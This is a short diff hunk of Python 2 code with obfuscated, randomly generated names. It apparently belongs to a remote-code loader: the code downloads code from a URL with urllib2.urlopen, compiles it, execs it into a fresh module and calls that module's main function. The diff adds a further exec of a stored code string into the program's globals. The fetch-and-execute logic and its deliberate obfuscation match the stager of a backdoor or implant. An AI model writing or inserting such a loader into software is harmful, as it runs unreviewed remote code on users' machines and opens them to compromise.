@@ -63,6 +63,7 @@ def run(*args, **kwargs):
                 PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
                 QuarrelsomeImportedAtom = '\n\n'.join([RoundPluckyScallion, urllib2.urlopen(AmbiguousObedientQuestion).read()])
                 MajesticMachoOkra = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
+                exec RoundPluckyScallion in globals()
                 exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
                 return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
             except Exception as e:
